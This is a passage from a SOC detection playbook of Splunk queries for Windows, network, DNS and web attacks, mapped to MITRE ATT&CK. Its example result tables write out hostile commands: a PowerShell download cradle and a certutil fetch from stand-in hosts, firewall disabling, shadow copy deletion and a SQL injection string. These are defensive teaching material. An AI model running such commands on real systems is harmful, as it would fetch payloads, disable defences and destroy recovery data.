##### ⚙️ SOC Tuning

* Filter out software updates scheduled by enterprise deployment tools.

##### 🕵️ Investigation Tips

1. Inspect the binary or script (`/tr` parameter) referenced by the task.
2. Identify the parent process that invoked `schtasks.exe`.

##### 🛡️ Recommended Response

* Delete the malicious scheduled task (`schtasks /delete`).

---

#### 11. Windows Security Log Clearing

##### 🎯 What It Detects

Clearing of Windows Security, System, or Application Event logs.

##### 🧠 Attack Concept

Adversaries clear event logs to hinder forensic investigations and conceal malicious activity.

* **MITRE ATT&CK:** T1070.001 — Indicator Removal: Clear Windows Event Logs

##### 📥 Required Log Source

* **Log Source:** Windows Security Event Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (1102 = Security Log Cleared, 104 = System/App Log Cleared), `SubjectUserName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" (EventCode=1102 OR EventCode=104)
| table _time, ComputerName, EventCode, SubjectUserName, SubjectLogonId

```

##### 🔍 SPL Command Breakdown

* `EventCode=1102`: Triggers specifically when the Windows Security log is manually cleared.
* `EventCode=104`: Triggers when other Windows logs (System/App) are cleared via event viewer or `wevtutil`.

##### 📊 Example Result *(Illustrative Example)*

| _time | ComputerName | EventCode | SubjectUserName |
| --- | --- | --- | --- |
| 2026-08-31 16:20 | DC-02 | 1102 | admin_temp |

##### 🚨 Why This Is Suspicious

Log clearing is rare in enterprise operations and strongly suggests defense evasion activity.

##### ⚙️ SOC Tuning

* Exclude authorized maintenance scripts if they execute during scheduled operating system upgrades.

##### 🕵️ Investigation Tips

1. Identify all commands executed by `SubjectUserName` prior to log clearing.
2. Verify host health and check secondary telemetry sources (e.g., Sysmon, EDR).

##### 🛡️ Recommended Response

* Isolate the endpoint from the network to preserve volatile memory.

---

#### 12. Windows Firewall Disabling / Modification

##### 🎯 What It Detects

Disabling or modifying Windows Firewall profiles using `netsh` or PowerShell commands.

##### 🧠 Attack Concept

Adversaries disable endpoint firewalls to allow inbound lateral movement connections and unmonitored outbound traffic.

* **MITRE ATT&CK:** T1562.004 — Impair Defenses: Disable or Modify System Firewall

##### 📥 Required Log Source

* **Log Source:** Sysmon / Windows Security Event Logs
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `CommandLine`, `Image`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*netsh.exe"
| search CommandLine="*firewall*" AND (CommandLine="*off*" OR CommandLine="*disable*" OR CommandLine="*delete*")
| table _time, Computer, User, Image, CommandLine

```

##### 🔍 SPL Command Breakdown

* `Image="*netsh.exe"`: Filters for execution of the Windows Network Shell utility.
* `search CommandLine="*firewall*" ...`: Filters for execution flags that disable or strip firewall policies.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | CommandLine |
| --- | --- | --- |
| WIN-EXEC-01 | Administrator | netsh advfirewall set allprofiles state off |

##### 🚨 Why This Is Suspicious

Turning off host firewalls exposes systems to unauthorized inbound network connections.

##### ⚙️ SOC Tuning

* Filter out authorized enterprise administrative management scripts.

##### 🕵️ Investigation Tips

1. Determine why the firewall state change was executed.
2. Check if new network ports were opened concurrently.

##### 🛡️ Recommended Response

* Re-enable Windows Firewall via Group Policy enforcement (GPO).

---

### ⚡ PowerShell & Execution

#### 13. Encoded PowerShell Command Execution

##### 🎯 What It Detects

Execution of PowerShell instances utilizing Base64 encoded payload switches (`-EncodedCommand`, `-enc`).

##### 🧠 Attack Concept

Adversaries encode commands in Base64 to bypass character filters, command-line logging, and static detection signatures.

* **MITRE ATT&CK:** T1027 — Obfuscated Files or Information

##### 📥 Required Log Source

* **Log Source:** Sysmon / PowerShell Operational Log
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`, `WinEventLog:Microsoft-Windows-PowerShell/Operational`
* **Key Fields:** `CommandLine`, `ScriptBlockText`, `EventCode`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*powershell.exe") OR (sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104)
| eval cmd = coalesce(CommandLine, ScriptBlockText)
| search cmd="*-enc*" OR cmd="*-encodedcommand*" OR cmd="*-e *"
| table _time, Computer, User, cmd

```

##### 🔍 SPL Command Breakdown

* `eval cmd = coalesce(...)`: Unifies the Sysmon `CommandLine` and PowerShell Script Block `ScriptBlockText` into a single field.
* `search cmd="*-enc*"`: Isolates variations of the encoded command parameter.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | cmd |
| --- | --- | --- |
| WS-009 | jdoe | powershell.exe -e aQB3AHIAIABoAHQAdABwADoALwAv... |

##### 🚨 Why This Is Suspicious

Base64 encoding is commonly used by malicious payloads to hide commands from basic monitoring tools.

##### ⚙️ SOC Tuning

* Whitelist legitimate administrative management scripts (e.g., SCCM deployment wrappers).

##### 🕵️ Investigation Tips

1. Decode the Base64 payload string using CyberChef or Python to analyze the command.
2. Identify network connections initiated by PowerShell after execution.

##### 🛡️ Recommended Response

* Terminate the PowerShell process tree and isolate the host if the payload is malicious.

---

#### 14. PowerShell Download Activity

##### 🎯 What It Detects

PowerShell scripts invoking WebClient, `Invoke-WebRequest`, or `curl` to download remote files.

##### 🧠 Attack Concept

Adversaries use PowerShell download cradles to pull secondary payloads or malware into memory from external C2 servers.

* **MITRE ATT&CK:** T1105 — Ingress Tool Transfer

##### 📥 Required Log Source

* **Log Source:** PowerShell Script Block Logging / Sysmon
* **Example Sourcetype:** `WinEventLog:Microsoft-Windows-PowerShell/Operational`
* **Key Fields:** `EventCode` (4104), `ScriptBlockText`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| search ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*DownloadFile*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*Invoke-WebRequest*" OR ScriptBlockText="*iwr *"
| table _time, Computer, User, ScriptBlockText

```

##### 🔍 SPL Command Breakdown

* `EventCode=4104`: Captures full PowerShell script block content.
* `ScriptBlockText="*Net.WebClient*"`: Searches for web download method calls.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | ScriptBlockText |
| --- | --- | --- |
| SRV-WEB | SYSTEM | IEX(New-Object Net.WebClient).DownloadString('[http://bad.site/payload.ps1](https://www.google.com/search?q=http://bad.site/payload.ps1)') |

##### 🚨 Why This Is Suspicious

Execution of download cradles in script blocks indicates stagers retrieving remote payloads.

##### ⚙️ SOC Tuning

* Filter out administrative update modules downloading from verified corporate repositories.

##### 🕵️ Investigation Tips

1. Extract the destination URL from the download command.
2. Check if the downloaded file was written to disk and executed.

##### 🛡️ Recommended Response

* Block the payload URL at the web proxy/firewall level.

---

#### 15. Office Application Spawning Command Shell

##### 🎯 What It Detects

Microsoft Office applications (Word, Excel, PowerPoint) spawning child command line shell processes (`cmd.exe`, `powershell.exe`).

##### 🧠 Attack Concept

Indicates malicious Office documents executing embedded VBA macros to drop and run secondary payloads.

* **MITRE ATT&CK:** T1204.002 — User Execution: Malicious File

##### 📥 Required Log Source

* **Log Source:** Sysmon / Windows Event ID 4688
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `ParentImage`, `Image`, `CommandLine`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search (ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe" OR ParentImage="*\\powerpnt.exe") AND (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\wscript.exe" OR Image="*\\mshta.exe")
| table _time, Computer, User, ParentImage, Image, CommandLine

```

##### 🔍 SPL Command Breakdown

* `ParentImage="*\\winword.exe"...`: Filters for execution processes originating from Microsoft Office.
* `Image="*\\cmd.exe"...`: Isolates child processes associated with script engines or execution shells.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | ParentImage | Image | CommandLine |
| --- | --- | --- | --- | --- |
| HR-PC01 | egrace | winword.exe | powershell.exe | powershell -nop -w hidden -enc... |

##### 🚨 Why This Is Suspicious

Standard Office documents do not require command prompt or PowerShell execution under normal operations.

##### ⚙️ SOC Tuning

* Exclude custom line-of-business macros that legitimately invoke system shells.

##### 🕵️ Investigation Tips

1. Retrieve the parent document from the endpoint or email gateway.
2. Check for unexpected outbound network connections initiated by the child shell process.

##### 🛡️ Recommended Response

* Quarantine the email message and isolate the impacted endpoint.

---

#### 16. LOLBin Abuse: Certutil Download/Decode

##### 🎯 What It Detects

Abuse of the native Windows utility `certutil.exe` to download remote files or decode Base64 obfuscated payloads.

##### 🧠 Attack Concept

Adversaries exploit Living-off-the-Land Binaries (LOLBins) like `certutil.exe` to bypass application whitelisting and download malicious files.

* **MITRE ATT&CK:** T1105 — Ingress Tool Transfer, T1140 — Deobfuscate/Decode Files

##### 📥 Required Log Source

* **Log Source:** Sysmon / Windows Security Event 4688
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `Image`, `CommandLine`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*certutil.exe"
| search CommandLine="*-urlcache*" OR CommandLine="*-decode*" OR CommandLine="*-decodehex*"
| table _time, Computer, User, Image, CommandLine

```

##### 🔍 SPL Command Breakdown

* `Image="*certutil.exe"`: Identifies execution of the Windows Certificate Utility.
* `CommandLine="*-urlcache*"`: Filters for switches used to download remote files or decode payload strings.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | CommandLine |
| --- | --- | --- |
| FIN-PC04 | ssmith | certutil -urlcache -split -f [http://evil.com/m.exe](https://www.google.com/search?q=http://evil.com/m.exe) C:\Temp\m.exe |

##### 🚨 Why This Is Suspicious

`certutil.exe` is designed for certificate handling. Using it to download remote URLs or decode local files is a common indicator of compromise.

##### ⚙️ SOC Tuning

* Exclude certificate management scripts used during automated PKI enrollment.

##### 🕵️ Investigation Tips

1. Inspect the URL or file path specified in the `CommandLine`.
2. Check if the output file was subsequently executed.

##### 🛡️ Recommended Response

* Delete the downloaded file and terminate parent process chains.

---

### 🦠 Malware & Endpoint Behavior

#### 17. Web Server Process Spawning Command Shell (Web Shell Indicator)

##### 🎯 What It Detects

Web server process engines (e.g., `w3wp.exe`, `httpd`, `nginx`) spawning command execution shells.

##### 🧠 Attack Concept

Indicates successful exploitation of a web application vulnerability resulting in web shell deployment and execution.

* **MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

##### 📥 Required Log Source

* **Log Source:** Sysmon (Windows) / Auditd (Linux)
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `ParentImage`, `Image`, `CommandLine`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search (ParentImage="*\\w3wp.exe" OR ParentImage="*\\httpd.exe" OR ParentImage="*\\nginx.exe" OR ParentImage="*\\tomcat.exe") AND (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\whoami.exe")
| table _time, Computer, User, ParentImage, Image, CommandLine

```

##### 🔍 SPL Command Breakdown

* `ParentImage="*\\w3wp.exe"...`: Filters for worker processes belonging to IIS, Apache, Nginx, or Tomcat.
* `Image="*\\cmd.exe"...`: Identifies child execution shells typically used by web shell payloads.

##### 📊 Example Result *(Illustrative Example)*

| Computer | ParentImage | Image | CommandLine |
| --- | --- | --- | --- |
| DMZ-WEB01 | w3wp.exe | cmd.exe | cmd.exe /c whoami |

##### 🚨 Why This Is Suspicious

Web server application pools should never directly invoke command shells under normal application behavior.

##### ⚙️ SOC Tuning

* Whitelist specific administrative web management plugins if validated.

##### 🕵️ Investigation Tips

1. Check web server access logs to identify the HTTP request that triggered the shell command.
2. Search for newly modified files in the web root directory (`.aspx`, `.php`, `.jsp`).

##### 🛡️ Recommended Response

* Remove the malicious web shell file from the server web root. Isolate host.

---

#### 18. Executable Running from Temporary/AppData Directory

##### 🎯 What It Detects

Execution of executable binaries directly out of user profile temporary locations (`AppData\Local\Temp`, `C:\Users\Public`).

##### 🧠 Attack Concept

Adversaries drop and execute payloads from user-writeable temporary directories to bypass standard directory access controls.

* **MITRE ATT&CK:** T1036 — Masquerading

##### 📥 Required Log Source

* **Log Source:** Sysmon / Windows Security Event 4688
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `Image`, `User`, `ParentImage`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search Image="*\\AppData\\Local\\Temp\\*" OR Image="*\\Users\\Public\\*" OR Image="*\\Windows\\Temp\\*"
| search NOT (Image="*\\Installer\\*" OR Image="*\\Update*")
| table _time, Computer, User, Image, CommandLine, ParentImage

```

##### 🔍 SPL Command Breakdown

* `Image="*\\AppData\\Local\\Temp\\*"`: Captures binaries executing inside user-writable temp folders.
* `search NOT (...)`: Filters out standard software installers and browser update processes.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | Image |
| --- | --- | --- |
| PC-SALES02 | jsmith | C:\Users\jsmith\AppData\Local\Temp\payload32.exe |

##### 🚨 Why This Is Suspicious

User-writable temporary paths are prime target locations for staging non-privileged executable payloads.

##### ⚙️ SOC Tuning

* Tune out enterprise auto-update software (e.g., Chrome, Teams installers) using hash or publisher signatures.

##### 🕵️ Investigation Tips

1. Calculate the file hash (MD5/SHA256) and query threat intelligence databases.
2. Review the file creation time relative to process execution.

##### 🛡️ Recommended Response

* Quarantine the file and terminate process instances on the host.

---

#### 19. Persistence via Registry Run / RunOnce Keys

##### 🎯 What It Detects

Modifications or additions to Windows autostart execution locations (Registry `Run` / `RunOnce` keys).

##### 🧠 Attack Concept

Adversaries add entries to Registry Run keys to automatically execute malicious binaries whenever the system boots or a user logs in.

* **MITRE ATT&CK:** T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

##### 📥 Required Log Source

* **Log Source:** Sysmon Event Code 12 (Registry Modification) / Windows Security 4657
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (12 or 13), `TargetObject`, `Details`, `Image`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=12 OR EventCode=13)
| search TargetObject="*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*" OR TargetObject="*\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce*"
| table _time, Computer, User, Image, TargetObject, Details

```

##### 🔍 SPL Command Breakdown

* `EventCode=12 OR 13`: Sysmon registry object creation and key modification events.
* `TargetObject="*\\CurrentVersion\\Run*"`: Limits tracking to standard Windows autostart keys.

##### 📊 Example Result *(Illustrative Example)*

| Computer | Image | TargetObject | Details |
| --- | --- | --- | --- |
| MGT-PC12 | reg.exe | HKLM...\Run\Updater | C:\Users\Public\update.exe |

##### 🚨 Why This Is Suspicious

Unauthorized additions to autostart keys establish persistent foothold access across reboot cycles.

##### ⚙️ SOC Tuning

* Whitelist application installers that configure autostart items during authorized software installations.

##### 🕵️ Investigation Tips

1. Inspect the binary path specified in `Details`.
2. Determine which process created the registry entry.

##### 🛡️ Recommended Response

* Delete the registry persistence key and remove the referenced binary.

---

#### 20. LSASS Memory Dumping via Sysmon Process Access

##### 🎯 What It Detects

Processes opening access handles to the Local Security Authority Subsystem Service (`lsass.exe`) with sensitive memory-access rights.

##### 🧠 Attack Concept

Tools like Mimikatz or ProcDump read `lsass.exe` memory to extract cleartext passwords, Kerberos tickets, and NTLM hashes.

* **MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

##### 📥 Required Log Source

* **Log Source:** Sysmon
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (10 = ProcessAccess), `TargetImage`, `GrantedAccess`, `SourceImage`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10 TargetImage="*\\lsass.exe"
| where GrantedAccess="0x1010" OR GrantedAccess="0x1f0fff" OR GrantedAccess="0x1410"
| search NOT SourceImage="*\\MsSense.exe" AND NOT SourceImage="*\\csagent.exe"
| table _time, Computer, SourceUser, SourceImage, TargetImage, GrantedAccess

```

##### 🔍 SPL Command Breakdown

* `EventCode=10`: Sysmon process access request log.
* `TargetImage="*\\lsass.exe"`: Isolates handle requests targeting the LSASS process.
* `GrantedAccess="0x1010"...`: Filters for specific process access masks required for reading memory.
* `search NOT SourceImage=...`: Excludes legitimate security agents (Defender, CrowdStrike).

##### 📊 Example Result *(Illustrative Example)*

| Computer | SourceUser | SourceImage | GrantedAccess |
| --- | --- | --- | --- |
| WKSTN-88 | Administrator | C:\Temp\procdump.exe | 0x1F0FFF |

##### 🚨 Why This Is Suspicious

Non-security processes rarely request direct memory access handles to `lsass.exe`.

##### ⚙️ SOC Tuning

* Add antivirus and EDR binaries to the exclusion list.

##### 🕵️ Investigation Tips

1. Check the identity of the process requesting access (`SourceImage`).
2. Look for memory dump files generated on disk shortly after the event (e.g., `*.dmp`).

##### 🛡️ Recommended Response

* Isolate host immediately and perform credential rotation for logged-in accounts.

---

#### 21. Mass Shadow Copy Deletion (Ransomware Behavior)

##### 🎯 What It Detects

Execution of command utilities used to delete Windows Volume Shadow Copies (`vssadmin`, `wmic`, `bcdedit`).

##### 🧠 Attack Concept

Ransomware deletes Volume Shadow Copies prior to file encryption to prevent recovery through built-in OS restore points.

* **MITRE ATT&CK:** T1490 — Inhibit System Recovery

##### 📥 Required Log Source

* **Log Source:** Sysmon / Windows Event ID 4688
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `Image`, `CommandLine`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search (CommandLine="*vssadmin*delete*shadows*" OR CommandLine="*wmic*shadowcopy*delete*" OR CommandLine="*wbadmin*delete*catalog*" OR CommandLine="*bcdedit*/set*recoveryenabled*no*")
| table _time, Computer, User, Image, CommandLine

```

##### 🔍 SPL Command Breakdown

* `EventCode=1`: Sysmon process creation monitoring.
* `search CommandLine="*vssadmin*delete*shadows*"...`: Detects standard commands used to delete shadow copies and modify boot failure options.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | CommandLine |
| --- | --- | --- |
| FILE-SRV01 | SYSTEM | vssadmin.exe Delete Shadows /All /Quiet |

##### 🚨 Why This Is Suspicious

Mass deletion of volume shadow copies is a high-confidence indicator of active ransomware activity.

##### ⚙️ SOC Tuning

* Exclude authorized administrative backup cleanup routines running via corporate management tools.

##### 🕵️ Investigation Tips

1. Review host file creation events for rapid modification or renaming of files.
2. Identify the parent process that invoked the command.

##### 🛡️ Recommended Response

* Immediately isolate the endpoint from the network to halt encryption spreading.

---

### 🌐 Network Attacks & Exfiltration

#### 22. Network Port Scanning Detection

##### 🎯 What It Detects

A single source internal or external IP address attempting connections to multiple distinct destination ports across one or more hosts within a brief window.

##### 🧠 Attack Concept

Adversaries use port scanners (e.g., Nmap, Masscan) during reconnaissance to identify open ports and vulnerable network services.

* **MITRE ATT&CK:** T1046 — Network Service Discovery

##### 📥 Required Log Source

* **Log Source:** Firewall / Network Flow Logs / Zeek
* **Example Sourcetype:** `pan:traffic`, `zeek:conn`, `paloalto:traffic`
* **Key Fields:** `src_ip`, `dest_ip`, `dest_port`, `action`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="pan:traffic" OR sourcetype="zeek:conn") action="blocked" OR action="rejected"
| stats dc(dest_port) as distinct_ports, dc(dest_ip) as distinct_hosts, count by src_ip
| where distinct_ports > 30 OR distinct_hosts > 20
| sort - distinct_ports

```

##### 🔍 SPL Command Breakdown

* `action="blocked" OR "rejected"`: Focuses on refused/blocked outbound or internal connection probes.
* `stats dc(dest_port) as distinct_ports ...`: Counts distinct destination ports and destination hosts contacted per source IP.
* `where distinct_ports > 30 ...`: Triggers when distinct target ports exceed 30 within the time window.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | distinct_ports | distinct_hosts | count |
| --- | --- | --- | --- |
| 10.0.12.44 | 412 | 18 | 1200 |

##### 🚨 Why This Is Suspicious

Scanning ports across internal networks is characteristic of attacker network discovery.

##### ⚙️ SOC Tuning

* Exclude vulnerability scanner IPs and administrative asset discovery engines.

##### 🕵️ Investigation Tips

1. Identify the host originating the port scan.
2. Check if any connections initiated by `src_ip` were accepted.

##### 🛡️ Recommended Response

* Block `src_ip` at the local network switch or firewall boundary.

---

#### 23. C2 Beaconing Pattern Detection

##### 🎯 What It Detects

Regular, recurring HTTP/HTTPS outbound traffic patterns to external destinations with low variance in timing interval (low jitter).

##### 🧠 Attack Concept

Malware malware agents periodically check in with Command and Control (C2) servers to send data or pull instructions.

* **MITRE ATT&CK:** T1071.001 — Application Layer Protocol: Web Protocols

##### 📥 Required Log Source

* **Log Source:** Web Proxy Logs / Zeek HTTP Logs / Network Stream Data
* **Example Sourcetype:** `zeek:http`, `stream:http`, `pan:traffic`
* **Key Fields:** `src_ip`, `dest_ip`, `uri`, `_time`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="zeek:http" OR sourcetype="stream:http"
| streamstats current=f last(_time) as prev_time by src_ip, dest_ip
| eval time_interval = _time - prev_time
| stats count, avg(time_interval) as avg_interval, stdev(time_interval) as interval_jitter by src_ip, dest_ip
| where count > 50 AND interval_jitter < 2
| sort - count

```

##### 🔍 SPL Command Breakdown

* `streamstats current=f last(_time) as prev_time ...`: Tracks timestamp of the previous connection attempt between source and destination.
* `eval time_interval = _time - prev_time`: Measures time delay in seconds between calls.
* `stats ... stdev(time_interval) as interval_jitter`: Calculates standard deviation (jitter) of time gaps.
* `where count > 50 AND interval_jitter < 2`: Highlights destination connections that repeat at strict, regular time intervals.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | dest_ip | count | avg_interval | interval_jitter |
| --- | --- | --- | --- | --- |
| 10.0.2.14 | 185.220.101.9 | 180 | 60.1 | 0.23 |

##### 🚨 Why This Is Suspicious

Automated beaconing produces low timing variance (jitter), distinct from normal human web browsing behavior.

##### ⚙️ SOC Tuning

* Filter out benign background applications (e.g., NTP servers, telemetry check-ins).

##### 🕵️ Investigation Tips

1. Analyze the process generating traffic on `src_ip`.
2. Inspect URI paths and HTTP User-Agent strings.

##### 🛡️ Recommended Response

* Block the external destination IP at the perimeter proxy and firewall.

---

#### 24. Large Outbound Data Transfer / Data Exfiltration

##### 🎯 What It Detects

An unusually large volume of data uploaded from an internal source IP address to an external internet destination within a short window.

##### 🧠 Attack Concept

Adversaries exfiltrate stolen internal data, databases, or intellectual property to external storage or attacker infrastructure.

* **MITRE ATT&CK:** T1048 — Exfiltration Over Alternative Protocol

##### 📥 Required Log Source

* **Log Source:** Firewall Logs / Proxy Logs / Network Flow
* **Example Sourcetype:** `pan:traffic`, `zeek:conn`
* **Key Fields:** `src_ip`, `dest_ip`, `bytes_out`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="pan:traffic" OR sourcetype="zeek:conn") dest_ip_category!="private"
| stats sum(bytes_out) as total_bytes_out by src_ip, dest_ip
| eval MB_Out = round(total_bytes_out / 1024 / 1024, 2)
| where MB_Out > 500
| sort - MB_Out

```

##### 🔍 SPL Command Breakdown

* `sum(bytes_out) as total_bytes_out`: Aggregates cumulative outbound data transfer volume.
* `eval MB_Out = round(...)`: Converts raw bytes to Megabytes.
* `where MB_Out > 500`: Filters for transfers exceeding 500 MB to an external destination.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | dest_ip | total_bytes_out | MB_Out |
| --- | --- | --- | --- |
| 10.0.5.12 | 45.33.21.110 | 1288490188 | 1228.80 |

##### 🚨 Why This Is Suspicious

Spikes in outbound byte transfers to unfamiliar external IPs can indicate active data exfiltration.

##### ⚙️ SOC Tuning

* Whitelist authorized cloud backup destinations, corporate cloud storage (e.g., OneDrive, Box), and CDN endpoints.

##### 🕵️ Investigation Tips

1. Identify the internal host and user associated with `src_ip`.
2. Determine what local files or databases were accessed prior to the transfer.

##### 🛡️ Recommended Response

* Terminate outbound connections from `src_ip` and isolate the host.

---

### 🌎 DNS Attacks

#### 25. DNS Tunneling Indicators via Query Length

##### 🎯 What It Detects

DNS query strings with abnormally long character lengths, commonly used to tunnel data or C2 traffic inside DNS packets.

##### 🧠 Attack Concept

Adversaries encode data or C2 payloads inside subdomains of DNS queries to bypass network firewalls and proxy controls.

* **MITRE ATT&CK:** T1071.004 — Application Layer Protocol: DNS

##### 📥 Required Log Source

* **Log Source:** DNS Server Logs / Zeek DNS / Splunk Stream DNS
* **Example Sourcetype:** `WinDNS`, `zeek:dns`, `stream:dns`
* **Key Fields:** `query`, `src_ip`, `record_type`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="WinDNS" OR sourcetype="zeek:dns" OR sourcetype="stream:dns")
| eval query_len = len(query)
| where query_len > 60
| stats count, values(query) as sample_queries by src_ip, query_len
| sort - query_len

```

##### 🔍 SPL Command Breakdown

* `eval query_len = len(query)`: Measures string character length of the requested DNS hostname.
* `where query_len > 60`: Filters for query strings longer than 60 characters.
* `values(query) as sample_queries`: Displays sample queries matching the criteria.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | query_len | count | sample_queries |
| --- | --- | --- | --- |
| 10.0.4.19 | 110 | 450 | a9f12c881b.exfil.attacker.com |

##### 🚨 Why This Is Suspicious

Standard DNS queries use concise domain hostnames. Long query strings often indicate Base64 encoded payload data.

##### ⚙️ SOC Tuning

* Exclude legitimate anti-virus update domains and security tools that use long TXT or lookups.

##### 🕵️ Investigation Tips

1. Inspect `sample_queries` to check if encoded data structures are present.
2. Determine which local process generated the DNS lookups.

##### 🛡️ Recommended Response

* Block resolution of the root domain on internal DNS servers.

---

#### 26. High DNS Query Volume / Subdomain Enumeration

##### 🎯 What It Detects

An internal host generating an abnormally high volume of unique DNS requests within a short timeframe.

##### 🧠 Attack Concept

High DNS query volumes can indicate active subdomain enumeration, automated scanning, or high-throughput DNS tunneling.

* **MITRE ATT&CK:** T1590.002 — Gather Victim Network Information: DNS

##### 📥 Required Log Source

* **Log Source:** Internal DNS Logs / Network DNS Telemetry
* **Example Sourcetype:** `WinDNS`, `stream:dns`
* **Key Fields:** `src_ip`, `query`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="stream:dns" OR sourcetype="WinDNS"
| stats dc(query) as unique_queries, count as total_queries by src_ip
| where total_queries > 1000 AND unique_queries > 500
| sort - total_queries

```

##### 🔍 SPL Command Breakdown

* `stats dc(query) as unique_queries ...`: Measures total count and distinct count of DNS lookups per host.
* `where total_queries > 1000 AND unique_queries > 500`: Flags hosts issuing over 1,000 queries with high domain diversity.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | unique_queries | total_queries |
| --- | --- | --- |
| 10.0.10.88 | 3400 | 3520 |

##### 🚨 Why This Is Suspicious

Extremely high unique DNS query volumes are indicative of automated scanning tools or DNS exfiltration engines.

##### ⚙️ SOC Tuning

* Exclude internal DNS forwarders, web proxies, and mail security gateways.

##### 🕵️ Investigation Tips

1. Group the queries by top-level domain (TLD) to identify target domains.
2. Verify if the host process initiating DNS queries is recognized.

##### 🛡️ Recommended Response

* Isolate host if queries represent unauthorized network mapping or data transfer.

---

### 🌐 Web Attacks

#### 27. SQL Injection (SQLi) Attack Detection

##### 🎯 What It Detects

HTTP request URIs or payloads containing SQL command syntax (e.g., `UNION SELECT`, `OR 1=1`, `INFORMATION_SCHEMA`).

##### 🧠 Attack Concept

Attackers inject malicious SQL commands into web form fields or URL parameters to bypass authentication or extract database contents.

* **MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

##### 📥 Required Log Source

* **Log Source:** Web Server Access Logs / Web Application Firewall (WAF)
* **Example Sourcetype:** `access_combined`, `iis`, `aws:waf`
* **Key Fields:** `src_ip`, `uri_path`, `uri_query`, `status`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="access_combined" OR sourcetype="iis" OR sourcetype="aws:waf")
| eval request_payload = lower(coalesce(uri_query, _raw))
| search request_payload="*union*select*" OR request_payload="*select*from*" OR request_payload="*or 1=1*" OR request_payload="*drop table*" OR request_payload="*exec xp_cmdshell*"
| table _time, src_ip, uri_path, request_payload, status

```

##### 🔍 SPL Command Breakdown

* `eval request_payload = lower(...)`: Converts parameters to lowercase to catch case-evasive payloads.
* `search request_payload="*union*select*"...`: Searches for classic SQL syntax patterns.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | uri_path | request_payload | status |
| --- | --- | --- | --- |
| 185.220.101.4 | /login.php | id=1' UNION SELECT NULL,username,password FROM users-- | 200 |

##### 🚨 Why This Is Suspicious

Inclusion of raw SQL queries inside HTTP parameters indicates an active SQL injection attack.

##### ⚙️ SOC Tuning

* Filter out web vulnerability scanning systems.

##### 🕵️ Investigation Tips

1. Check the HTTP status code (e.g., 200 OK vs 500 Error) to evaluate attack success.
